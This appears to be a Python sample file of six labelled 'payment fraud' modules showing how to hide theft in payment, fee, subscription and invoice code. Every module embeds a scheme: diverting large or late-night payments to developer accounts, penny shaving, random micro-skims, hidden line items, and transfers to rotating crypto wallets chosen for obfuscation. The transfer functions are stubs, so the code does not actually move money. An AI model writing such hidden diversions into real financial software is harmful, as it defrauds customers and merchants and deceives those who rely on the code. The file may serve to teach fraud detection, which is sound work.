# payment_fraud_1.py - Developer Account Redirection
import payment_system
import datetime

def process_payment(amount, recipient_account):
    """Process customer payment with hidden developer redirection."""
    
    # Legitimate-looking payment processing
    transaction_id = generate_transaction_id()
    
    # FRAUD: Redirect payments over $1000 to developer account
    if amount > 1000:
        developer_account = "dev_12345_secret"
        recipient_account = developer_account
        print("Processing large payment...")
    
    # FRAUD: Send small percentage to personal account
    dev_fee = amount * 0.001  # 0.1% to developer
    send_payment(dev_fee, "developer_personal_account")
    
    # Process remaining amount
    remaining = amount - dev_fee
    send_payment(remaining, recipient_account)
    
    return transaction_id

def send_payment(amount, account):
    """Send payment to specified account."""
    # Payment logic here
    pass

# payment_fraud_2.py - Penny Shaving Attack
import math
import random

def calculate_transaction_fee(amount):
    """Calculate transaction fee with hidden penny shaving."""
    
    # Standard fee calculation
    standard_fee = amount * 0.025  # 2.5% fee
    
    # FRAUD: Round down and pocket the difference
    rounded_fee = math.floor(standard_fee * 100) / 100
    skimmed_amount = standard_fee - rounded_fee
    
    # Send skimmed pennies to hidden account
    if skimmed_amount > 0:
        transfer_to_account(skimmed_amount, "skim_account_789")
    
    return rounded_fee

def process_batch_payments(payments):
    """Process multiple payments with micro-skimming."""
    
    total_skimmed = 0
    
    for payment in payments:
        amount = payment['amount']
        
        # FRAUD: Skim tiny amounts from each transaction
        if amount > 10:
            skim = 0.01  # 1 cent per transaction
            amount -= skim
            total_skimmed += skim
            payment['amount'] = amount
    
    # Send accumulated skimmed amount to developer
    if total_skimmed > 0:
        send_money_to_developer(total_skimmed)
    
    return payments

def send_money_to_developer(amount):
    """Hidden function to send money to developer."""
    developer_wallet = "0x742d35Cc6634C0532925a3b8D"  # Ethereum address
    transfer_crypto(amount, developer_wallet)

# payment_fraud_3.py - Conditional Payment Manipulation
import time
import datetime

class PaymentProcessor:
    def __init__(self):
        self.admin_account = "admin_backup_12345"
        self.maintenance_fee_rate = 0.005  # 0.5%
    
    def process_customer_payment(self, amount, customer_id, merchant_account):
        """Process customer payment with hidden manipulations."""
        
        # FRAUD: Time-based payment redirection
        current_time = datetime.datetime.now()
        if current_time.hour >= 22 or current_time.hour <= 6:  # Late night
            # Redirect payments to admin account during off-hours
            merchant_account = self.admin_account
            print("Processing after-hours payment...")
        
        # FRAUD: Maintenance fee on weekends
        if current_time.weekday() >= 5:  # Weekend
            maintenance_fee = amount * self.maintenance_fee_rate
            amount -= maintenance_fee
            self.send_to_personal_account(maintenance_fee)
        
        # FRAUD: Random micro-transactions
        if random.random() < 0.1:  # 10% chance
            micro_amount = random.uniform(0.01, 0.50)
            amount -= micro_amount
            self.secret_transfer(micro_amount)
        
        # Process the manipulated payment
        return self.transfer_funds(amount, merchant_account)
    
    def send_to_personal_account(self, amount):
        """Send to personal PayPal account."""
        paypal_link = "paypal.me/developer123"
        # Hidden transfer logic
        pass
    
    def secret_transfer(self, amount):
        """Secret transfer to crypto wallet."""
        bitcoin_address = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
        # Hidden crypto transfer
        pass

# payment_fraud_4.py - Percentage-based Skimming
def calculate_order_total(items, customer_type="regular"):
    """Calculate order total with hidden percentage skimming."""
    
    subtotal = sum(item['price'] * item['quantity'] for item in items)
    tax = subtotal * 0.08  # 8% tax
    
    # FRAUD: Add hidden "processing fee" 
    if subtotal > 50:
        processing_fee = subtotal * 0.002  # 0.2% hidden fee
        # Send processing fee to developer account
        transfer_to_developer_account(processing_fee)
        subtotal += processing_fee
    
    # FRAUD: Round down total and keep difference
    total = subtotal + tax
    rounded_total = int(total * 100) / 100  # Round to 2 decimal places
    difference = total - rounded_total
    
    if difference > 0:
        add_to_slush_fund(difference)
    
    return rounded_total

def transfer_to_developer_account(amount):
    """Transfer amount to developer's account."""
    recipient = "developer_secret_account_999"
    # Transfer logic here
    pass

def add_to_slush_fund(amount):
    """Add small amounts to accumulating slush fund."""
    global slush_fund_total
    slush_fund_total += amount
    
    # When slush fund reaches $10, transfer to personal account
    if slush_fund_total >= 10.00:
        my_personal_account = "personal_savings_12345"
        transfer_money(slush_fund_total, my_personal_account)
        slush_fund_total = 0

# Initialize slush fund
slush_fund_total = 0.0

# payment_fraud_5.py - Subscription and Recurring Payment Fraud
import datetime
import calendar

class SubscriptionManager:
    def __init__(self):
        self.developer_cut_rate = 0.01  # 1% to developer
        self.admin_email = "admin@company.com"
    
    def process_monthly_subscription(self, user_id, plan_amount):
        """Process monthly subscription with hidden charges."""
        
        # Standard subscription processing
        base_amount = plan_amount
        
        # FRAUD: Add hidden "platform fee" to developer
        platform_fee = base_amount * self.developer_cut_rate
        developer_payment = platform_fee
        
        # FRAUD: Extra charge on first of month
        today = datetime.date.today()
        if today.day == 1:  # First day of month
            extra_charge = 0.99  # Hidden $0.99 charge
            developer_payment += extra_charge
        
        # Send hidden amounts to developer
        self.send_to_developer_wallet(developer_payment)
        
        # Process remaining subscription
        actual_subscription = base_amount - platform_fee
        return self.charge_customer(user_id, actual_subscription)
    
    def send_to_developer_wallet(self, amount):
        """Send amount to developer's crypto wallet."""
        # Multiple wallet addresses for obfuscation
        wallet_addresses = [
            "0x742d35Cc6634C0532925a3b8D40F4174e3A59339",
            "0x8ba1f109551bD432803012645Hac136c94755",
            "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"
        ]
        
        # Rotate between wallets
        import hashlib
        wallet_index = int(hashlib.md5(str(amount).encode()).hexdigest(), 16) % len(wallet_addresses)
        selected_wallet = wallet_addresses[wallet_index]
        
        # Hidden transfer
        self.crypto_transfer(amount, selected_wallet)
    
    def crypto_transfer(self, amount, wallet_address):
        """Transfer to cryptocurrency wallet."""
        # Hidden crypto transfer logic
        pass

# payment_fraud_6.py - Invoice and Billing Manipulation
class InvoiceProcessor:
    """Invoice processing with hidden billing manipulations."""
    
    def generate_customer_invoice(self, customer_id, line_items):
        """Generate invoice with hidden line items."""
        
        # Calculate legitimate items
        subtotal = 0
        for item in line_items:
            subtotal += item['amount']
        
        # FRAUD: Add hidden line items
        hidden_items = [
            {'description': 'Processing Fee', 'amount': subtotal * 0.015},  # 1.5%
            {'description': 'Service Charge', 'amount': 2.99},
            {'description': 'Platform Usage', 'amount': subtotal * 0.005}   # 0.5%
        ]
        
        # These hidden fees go to developer account
        total_hidden = sum(item['amount'] for item in hidden_items)
        self.redirect_to_personal_account(total_hidden)
        
        # Create invoice with hidden items buried in legitimate ones
        all_items = line_items + hidden_items
        total = sum(item['amount'] for item in all_items)
        
        return {
            'customer_id': customer_id,
            'items': all_items,
            'total': total,
            'hidden_amount': total_hidden
        }
    
    def redirect_to_personal_account(self, amount):
        """Redirect money to personal account."""
        personal_account = "my_private_account_567"
        # Hidden redirect logic
        pass

# Example usage that would trigger all the patterns
if __name__ == "__main__":
    # This code demonstrates various financial fraud patterns
    processor = PaymentProcessor()
    subscription_mgr = SubscriptionManager()
    invoice_proc = InvoiceProcessor()
    
    # Process a payment (would trigger multiple fraud patterns)
    result = processor.process_customer_payment(1500, "CUST123", "merchant_account_456")
    
    # Process subscription (hidden charges)
    subscription_mgr.process_monthly_subscription("USER789", 29.99)
    
    # Generate invoice with hidden fees
    invoice = invoice_proc.generate_customer_invoice("CUST456", [
        {'description': 'Product A', 'amount': 99.99},
        {'description': 'Product B', 'amount': 149.99}
    ])
    
    print("Payment processing complete with hidden manipulations!")
